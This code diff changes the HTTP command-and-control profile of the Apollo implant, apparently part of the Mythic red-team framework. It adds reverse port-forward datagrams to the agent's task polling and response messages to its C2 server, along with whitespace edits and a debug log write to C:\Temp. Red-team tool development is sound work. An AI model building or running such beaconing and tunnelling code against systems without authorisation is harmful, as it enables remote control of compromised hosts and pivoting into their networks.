@@ -157,7 +157,7 @@ namespace Mythic.C2Profiles
                 try
                 {
 #if USE_HTTPWEB
-                    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
+       		    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
                     request.KeepAlive = false;
                     request.Method = "Post";
                     request.ContentType = "text/plain";
@@ -172,7 +172,7 @@ namespace Mythic.C2Profiles
                     WebResponse response = request.GetResponse();
                     sw.Stop();
                     DebugWriteLine($"Took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to get response.");
-                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
+		    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                     {
                         result = base.cryptor.Decrypt(reader.ReadToEnd());
                     }
@@ -233,7 +233,7 @@ namespace Mythic.C2Profiles
                 }
                 catch (Exception ex)
                 {
-                    DebugWriteLine($"Error sending message. Reason: {ex.Message}\n\tStackTrace:{ex.StackTrace}");
+	            DebugWriteLine($"Error sending message. Reason: {ex.Message}\n\tStackTrace:{ex.StackTrace}");
 #if USE_WEBCLIENT
                     egressMtx.ReleaseMutex();
 #endif
@@ -244,7 +244,7 @@ namespace Mythic.C2Profiles
 #if USE_WEBCLIENT
             egressMtx.ReleaseMutex();
 #endif
-            return true;      
+            return true;
         }
 
         /// <summary>
@@ -293,7 +293,7 @@ namespace Mythic.C2Profiles
             return "";
         }
 
-        override public string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams=null)
+        override public string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams=null,PortFwdDatagram[] rdatagrams=null)
         {
             try // Try block for HTTP requests
             {
@@ -343,7 +343,8 @@ namespace Mythic.C2Profiles
                     action = "post_response",
                     responses = resps,
                     delegates = new Dictionary<string, string>[] { },
-                    socks = datagrams
+                    socks = datagrams,
+                    rportfwds = rdatagrams,
                 };
                 if (DelegateMessageRequestQueue.Count > 0)
                 {
@@ -413,6 +414,7 @@ namespace Mythic.C2Profiles
         /// <returns>CaramelTask with the next task to execute</returns>
         override public Mythic.Structs.TaskQueue GetMessages(Apollo.Agent agent)
         {
+
             Stopwatch sw = new Stopwatch();
             sw.Start();
             //DebugWriteLine("Attempting to send SOCKS datagrams...");
@@ -420,36 +422,48 @@ namespace Mythic.C2Profiles
             sw.Stop();
             DebugWriteLine($"SendSocksDatagrams took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to run.");
             sw.Restart();
+
             //DebugWriteLine("Sent all SOCKS datagrams!");
             TaskQueue response = new TaskQueue();
             List<Task> finalTaskList = new List<Task>();
             List<DelegateMessage> finalDelegateMessageList = new List<DelegateMessage>();
-            CheckTaskingRequest req = new CheckTaskingRequest()
+
+
+	    CheckTaskingRequest req = new CheckTaskingRequest()
             {
                 action = "get_tasking",
                 tasking_size = -1
             };
+
+
             if (DelegateMessageRequestQueue.Count > 0)
             {
+
                 DelegateMessageRequestMutex.WaitOne();
                 req.delegates = DelegateMessageRequestQueue.ToArray();
                 DelegateMessageRequestQueue.Clear();
                 DelegateMessageRequestMutex.ReleaseMutex();
             } else
             {
+
                 req.delegates = new Dictionary<string, string>[] { };
             }
+
             // Could add delegate post messages
             string json = JsonConvert.SerializeObject(req);
-            string id = Guid.NewGuid().ToString();
+
+	    string id = Guid.NewGuid().ToString();
             if (Send(id, json))
             {
+
                 string returnMsg = (string)Inbox.GetMessage(id);
-                //JObject test = (JObject)JsonConvert.DeserializeObject(returnMsg);
+		//JObject test = (JObject)JsonConvert.DeserializeObject(returnMsg);
                 ////Dictionary<string, object>[] testDictTasks = test.Value<Dictionary<string, object>[]>("tasks");
                 //Task[] testTasks = test.Value<Task[]>("tasks");
-                Mythic.Structs.CheckTaskingResponse resp = JsonConvert.DeserializeObject<Mythic.Structs.CheckTaskingResponse>(returnMsg);
-                if (resp.tasks != null)
+		Mythic.Structs.CheckTaskingResponse resp = new Mythic.Structs.CheckTaskingResponse();
+		resp = JsonConvert.DeserializeObject<Mythic.Structs.CheckTaskingResponse>(returnMsg);
+
+		if (resp.tasks != null)
                 {
                     foreach (Task task in resp.tasks)
                     {
@@ -473,13 +487,26 @@ namespace Mythic.C2Profiles
                 {
                     response.SocksDatagrams = resp.socks;
                 }
+                if (resp.rportfwds != null)
+                {
+                    response.PortFwdDg = new PortFwdDatagram[1];
+
+                    try{
+                        response.PortFwdDg[0] = JsonConvert.DeserializeObject<PortFwdDatagram>(resp.rportfwds[0]);
+                    }catch(Exception ex){
+                        using (StreamWriter writetext = new StreamWriter("C:\\Temp\\logEx.txt", true))
+                        {
+                            writetext.WriteLine(ex.ToString());
+                        }
+                    }
+		}
             }
-            response.Delegates = finalDelegateMessageList.ToArray();
-            response.Tasks = finalTaskList.ToArray();
-            sw.Stop();
+	    response.Delegates = finalDelegateMessageList.ToArray();
+	    response.Tasks = finalTaskList.ToArray();
+	    sw.Stop();
             DebugWriteLine($"Get tasking took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to run.");
             //SCTask task = JsonConvert.DeserializeObject<SCTask>(Post(json));
-            return response;
+	    return response;
         }
 
 
